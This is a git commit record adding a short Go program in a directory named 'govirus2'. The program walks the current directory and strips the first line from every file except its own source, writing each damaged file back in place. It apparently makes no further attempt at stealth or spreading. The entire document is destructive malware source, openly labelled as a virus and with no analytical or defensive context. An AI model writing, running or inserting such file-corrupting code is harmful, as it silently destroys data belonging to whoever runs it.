c85c42b8d9c66eb32f2d770bb466d7ec944f1a3d
Yassa Taiseer <yassataiseer@gmail.com>
2021-06-12 17:27:42 -0400

    commit

---
+++ govirus2/main.go
@@ -0,0 +1,43 @@
+package main
+
+import (
+    "fmt"
+    "io/ioutil"
+    "log"
+    "os"
+    "strings"
+)
+
+func main() {
+    files, err := ioutil.ReadDir("./")
+    if err != nil {
+        log.Fatal(err)
+    }
+ 
+    for _, f := range files {
+            fmt.Println(f.Name())
+            if(f.Name()=="main.go"){
+
+            }else{
+                start(f.Name())
+            }
+    }
+}
+func start(filename string){
+    path := filename
+    removeLine(path, 0)
+}
+
+func removeLine(path string, lineNumber int) {
+    file, err := ioutil.ReadFile(path)
+    if err != nil {
+        panic(err)
+    }
+
+    info, _ := os.Stat(path)
+    mode := info.Mode()
+
+    array := strings.Split(string(file), "\n")
+    array = append(array[:lineNumber], array[lineNumber+1:]...)
+    ioutil.WriteFile(path, []byte(strings.Join(array, "\n")), mode)
+}
